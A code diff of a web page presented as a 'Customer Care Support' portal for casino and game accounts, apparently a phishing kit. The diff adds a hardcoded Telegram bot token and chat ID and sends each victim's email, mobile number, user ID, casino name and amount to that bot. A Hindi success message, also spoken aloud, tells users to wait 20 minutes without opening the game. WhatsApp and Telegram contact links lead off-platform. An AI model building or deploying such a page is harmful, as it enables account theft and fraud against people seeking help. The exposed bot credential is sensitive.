@@ -179,105 +179,50 @@ textarea{
 
 <div class="header">
     <div class="logo">🛡️</div>
-
     <h1>Customer Care Support</h1>
-
-    <div class="subtitle">
-        Fast • Secure • Trusted Support Portal
-    </div>
+    <div class="subtitle">Fast • Secure • Trusted Support Portal</div>
 </div>
 
 <div class="card">
 
 <form id="supportForm">
+    <label>Registered Email</label>
+    <input type="email" id="email" placeholder="Enter your registered email" required>
 
-<label>Registered Email</label>
-<input
-    type="email"
-    id="email"
-    placeholder="Enter your registered email"
-    required
->
+    <label>Registered Mobile</label>
+    <input type="tel" id="mobile" placeholder="Enter your registered mobile" required>
 
-<label>Registered Mobile</label>
-<input
-    type="tel"
-    id="mobile"
-    placeholder="Enter your registered mobile"
-    required
->
+    <label>Casino / Game Name</label>
+    <input type="text" id="casino" placeholder="Enter name" required>
 
-<label>Casino / Game Name</label>
-<input
-    type="text"
-    id="casino"
-    placeholder="Enter name"
-    required
->
+    <label>User ID</label>
+    <input type="text" id="userId" placeholder="Enter your User ID" required>
 
-<label>User ID</label>
-<input
-    type="text"
-    id="userId"
-    placeholder="Enter your User ID"
-    required
->
+    <label>Withdrawal / Deposit Amount</label>
+    <input type="number" id="amount" placeholder="Enter amount" min="0">
 
-<label>Withdrawal / Deposit Amount</label>
-<input
-    type="number"
-    id="amount"
-    placeholder="Enter amount"
-    min="0"
->
+    <label>Issue Type</label>
+    <select id="issue" required>
+        <option value="">Select your issue</option>
+        <option>Withdrawal Processing</option>
+        <option>Withdrawal Declined</option>
+        <option>Deposit Not Received</option>
+        <option>Account Verification (KYC)</option>
+        <option>ID Blocked</option>
+        <option>Bonus Issue</option>
+        <option>Other Issue</option>
+    </select>
 
-<label>Issue Type</label>
+    <label>Additional Details</label>
+    <textarea id="message" placeholder="Describe your issue..."></textarea>
 
-<select id="issue" required>
+    <div class="note">⚠️ Never share your password, OTP, PIN, CVV or recovery code.</div>
 
-<option value="">Select your issue</option>
-
-<option>Withdrawal Processing</option>
-<option>Withdrawal Declined</option>
-<option>Deposit Not Received</option>
-<option>Account Verification (KYC)</option>
-<option>ID Blocked</option>
-<option>Bonus Issue</option>
-<option>Other Issue</option>
-
-</select>
-
-<label>Additional Details</label>
-
-<textarea
-    id="message"
-    placeholder="Describe your issue..."
-></textarea>
-
-<div class="note">
-⚠️ Never share your password, OTP, PIN, CVV or recovery code.
-</div>
-
-<button
-    type="submit"
-    class="btn submit"
-    id="submitBtn">
-    Submit Support Request
-</button>
-
+    <button type="submit" class="btn submit" id="submitBtn">Submit Support Request</button>
 </form>
 
-<button
-    class="btn whatsapp"
-    onclick="openWhatsApp()">
-    💬 Chat on WhatsApp
-</button>
-
-<button
-    class="btn telegram"
-    onclick="openTelegram()">
-    ✈️ Chat on Telegram
-</button>
+<button class="btn whatsapp" onclick="openWhatsApp()">💬 Chat on WhatsApp</button>
+<button class="btn telegram" onclick="openTelegram()">✈️ Chat on Telegram</button>
 
 </div>
 
@@ -287,192 +232,117 @@ Please verify the official support channel before sharing account information.
 
 </div>
 
-
 <!-- SUCCESS MODAL -->
-
 <div class="modal" id="successModal">
-
-<div class="modal-box">
-
-<div class="success-icon">✅</div>
-
-<h2>Request Received!</h2>
-
-<p style="margin-top:10px;color:#cbd5e1;line-height:1.6;">
-Aapki request expert team tak chali gayi hai.
-<br><br>
-Kripya 20 minutes wait karein aur tab tak
-game open na karein, taaki team ko issue check karne ka samay mil sake.
-</p>
-
-<button
-    class="close"
-    onclick="closeModal()">
-    Close
-</button>
-
+    <div class="modal-box">
+        <div class="success-icon">✅</div>
+        <h2>Request Received!</h2>
+        <p style="margin-top:10px;color:#cbd5e1;line-height:1.6;">
+        Aapki request expert team tak chali gayi hai.
+        <br><br>
+        Kripya 20 minutes wait karein aur tab tak game open na karein, taaki team ko issue check karne ka samay mil sake.
+        </p>
+        <button class="close" onclick="closeModal()">Close</button>
+    </div>
 </div>
-
-</div>
-
 
 <script>
-
-/*
-  IMPORTANT:
-  Replace this URL with your own Cloudflare Worker URL.
-  Example:
-  https://your-worker-name.your-subdomain.workers.dev
-*/
-
-const WORKER_URL =
-"https://YOUR-WORKER-NAME.YOUR-SUBDOMAIN.workers.dev";
-
+// Telegram Bot Credentials
+const BOT_TOKEN = "8975364349:AAFVCmYj6KU6SGVFozbjElM-DUOJuFuB53M";
+const CHAT_ID = "8882142102";
 
 const form = document.getElementById("supportForm");
 const submitBtn = document.getElementById("submitBtn");
 
-
 form.addEventListener("submit", async function(event){
-
     event.preventDefault();
 
     const data = {
-
-        email:
-        document.getElementById("email").value.trim(),
-
-        mobile:
-        document.getElementById("mobile").value.trim(),
-
-        casino:
-        document.getElementById("casino").value.trim(),
-
-        userId:
-        document.getElementById("userId").value.trim(),
-
-        amount:
-        document.getElementById("amount").value.trim(),
-
-        issue:
-        document.getElementById("issue").value,
-
-        message:
-        document.getElementById("message").value.trim()
-
+        email: document.getElementById("email").value.trim(),
+        mobile: document.getElementById("mobile").value.trim(),
+        casino: document.getElementById("casino").value.trim(),
+        userId: document.getElementById("userId").value.trim(),
+        amount: document.getElementById("amount").value.trim(),
+        issue: document.getElementById("issue").value,
+        message: document.getElementById("message").value.trim()
     };
 
-
-    if(
-        !data.email ||
-        !data.mobile ||
-        !data.casino ||
-        !data.userId ||
-        !data.issue
-    ){
-
+    if(!data.email || !data.mobile || !data.casino || !data.userId || !data.issue){
         alert("Please fill all required fields.");
         return;
-
     }
-
 
     submitBtn.disabled = true;
     submitBtn.textContent = "Submitting...";
 
+    // Formatting message for Telegram
+    const telegramMessage = `
+🚨 <b>New Support Request</b> 🚨
 
-    try{
+📧 <b>Email:</b> ${data.email}
+📱 <b>Mobile:</b> ${data.mobile}
+🎮 <b>Casino:</b> ${data.casino}
+🆔 <b>User ID:</b> ${data.userId}
+💰 <b>Amount:</b> ${data.amount ? data.amount : 'N/A'}
+⚠️ <b>Issue:</b> ${data.issue}
+📝 <b>Message:</b> ${data.message ? data.message : 'N/A'}
+    `;
 
-        const response = await fetch(WORKER_URL, {
-
-            method:"POST",
-
-            headers:{
-                "Content-Type":"application/json"
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
             },
-
-            body:JSON.stringify(data)
-
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: telegramMessage,
+                parse_mode: "HTML"
+            })
         });
-
 
         const result = await response.json();
 
-
-        if(!response.ok || !result.success){
-
+        if(!response.ok || !result.ok){
             throw new Error("Submission failed");
-
         }
 
+        // Show Success Modal
+        document.getElementById("successModal").style.display = "flex";
 
-        document.getElementById(
-            "successModal"
-        ).style.display = "flex";
-
-
+        // Voice Alert
         if("speechSynthesis" in window){
-
-            const speech =
-            new SpeechSynthesisUtterance(
+            const speech = new SpeechSynthesisUtterance(
                 "Aapki request expert team tak chali gayi hai. Kripya 20 minutes wait karein aur tab tak game open na karein."
             );
-
             speech.lang = "hi-IN";
             speech.rate = 0.9;
-
             window.speechSynthesis.cancel();
             window.speechSynthesis.speak(speech);
-
         }
-
 
         form.reset();
 
-
-    }catch(error){
-
-        alert(
-            "Request submit nahi ho paayi. Please thodi der baad try karein."
-        );
-
+    } catch(error) {
+        console.error(error);
+        alert("Request submit nahi ho paayi. Please thodi der baad try karein.");
     }
-
 
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit Support Request";
-
 });
 
-
 function closeModal(){
-
-    document.getElementById(
-        "successModal"
-    ).style.display = "none";
-
+    document.getElementById("successModal").style.display = "none";
 }
-
 
 function openWhatsApp(){
-
-    window.open(
-        "https://wa.me/917300365084",
-        "_blank"
-    );
-
+    window.open("https://wa.me/917300365084", "_blank");
 }
-
 
 function openTelegram(){
-
-    window.open(
-        "https://t.me/Helpcare02",
-        "_blank"
-    );
-
+    window.open("https://t.me/Helpcare02", "_blank");
 }
-
 </script>
 
 </body>
